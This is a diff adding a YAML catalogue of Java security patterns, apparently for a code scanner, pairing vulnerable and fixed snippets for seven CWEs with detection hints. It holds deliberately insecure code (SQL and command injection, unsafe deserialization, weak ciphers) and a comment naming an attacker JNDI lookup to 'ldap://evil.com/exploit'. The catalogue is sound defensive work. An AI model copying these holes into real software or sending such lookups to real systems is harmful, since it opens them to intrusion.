@@ -1,0 +1,99 @@
+# Java-specific CWE Security Patterns
+# v1: minimal coverage, contributions welcome
+
+patterns:
+  - cwe_id: CWE-502
+    severity: HIGH
+    tier: 1
+    title: "Java: unsafe ObjectInputStream deserialization"
+    vulnerable_example: |
+      ObjectInputStream ois = new ObjectInputStream(inputStream);
+      Object obj = ois.readObject();  // arbitrary class instantiation
+    safe_example: |
+      ObjectInputFilter filter = ObjectInputFilter.Config.createFilter("com.myapp.*;!*");
+      ObjectInputStream ois = new ObjectInputStream(inputStream);
+      ois.setObjectInputFilter(filter);
+      Object obj = ois.readObject();
+    detection_hint: "ObjectInputStream.readObject() without ObjectInputFilter"
+
+  - cwe_id: CWE-78
+    severity: HIGH
+    tier: 1
+    title: "Java: command injection via Runtime.exec()"
+    vulnerable_example: |
+      String cmd = "ping " + userInput;
+      Runtime.getRuntime().exec(cmd);
+    safe_example: |
+      ProcessBuilder pb = new ProcessBuilder("ping", "-c", "1", hostname);
+      pb.redirectErrorStream(true);
+      Process p = pb.start();
+    detection_hint: "Runtime.exec() or ProcessBuilder with string concatenation of user input"
+
+  - cwe_id: CWE-89
+    severity: HIGH
+    tier: 1
+    title: "Java: SQL injection via string concatenation"
+    vulnerable_example: |
+      String query = "SELECT * FROM users WHERE name = '" + userName + "'";
+      Statement stmt = conn.createStatement();
+      ResultSet rs = stmt.executeQuery(query);
+    safe_example: |
+      PreparedStatement ps = conn.prepareStatement("SELECT * FROM users WHERE name = ?");
+      ps.setString(1, userName);
+      ResultSet rs = ps.executeQuery();
+    detection_hint: "Statement.executeQuery with string concat instead of PreparedStatement"
+
+  - cwe_id: CWE-200
+    severity: HIGH
+    tier: 1
+    title: "Java: Spring Boot actuator endpoints exposed"
+    vulnerable_example: |
+      # application.properties
+      management.endpoints.web.exposure.include=*
+      management.endpoint.env.enabled=true
+    safe_example: |
+      # application.properties
+      management.endpoints.web.exposure.include=health,info
+      management.endpoint.env.enabled=false
+      management.endpoints.web.base-path=/internal/manage
+    detection_hint: "management.endpoints.web.exposure.include=* in properties/yaml"
+
+  - cwe_id: CWE-917
+    severity: HIGH
+    tier: 1
+    title: "Java: JNDI injection via unchecked lookup strings"
+    vulnerable_example: |
+      String lookupName = request.getParameter("resource");
+      Context ctx = new InitialContext();
+      Object obj = ctx.lookup(lookupName);  // attacker sends ldap://evil.com/exploit
+    safe_example: |
+      String lookupName = request.getParameter("resource");
+      if (!ALLOWED_RESOURCES.contains(lookupName)) { throw new SecurityException(); }
+      Context ctx = new InitialContext();
+      Object obj = ctx.lookup(lookupName);
+    detection_hint: "InitialContext.lookup() with user-controlled string"
+
+  - cwe_id: CWE-79
+    severity: HIGH
+    tier: 1
+    title: "Java: reflected XSS via unescaped output"
+    vulnerable_example: |
+      String name = request.getParameter("name");
+      response.getWriter().write("<h1>Hello " + name + "</h1>");
+    safe_example: |
+      String name = request.getParameter("name");
+      String safe = StringEscapeUtils.escapeHtml4(name);
+      response.getWriter().write("<h1>Hello " + safe + "</h1>");
+    detection_hint: "getWriter().write() or println() with unsanitized getParameter()"
+
+  - cwe_id: CWE-327
+    severity: HIGH
+    tier: 1
+    title: "Java: weak cryptographic algorithms"
+    vulnerable_example: |
+      MessageDigest md = MessageDigest.getInstance("MD5");
+      Cipher cipher = Cipher.getInstance("DES/ECB/PKCS5Padding");
+    safe_example: |
+      MessageDigest md = MessageDigest.getInstance("SHA-256");
+      Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
+    detection_hint: "getInstance(\"MD5\") or getInstance(\"DES\") or getInstance(\"SHA-1\")"
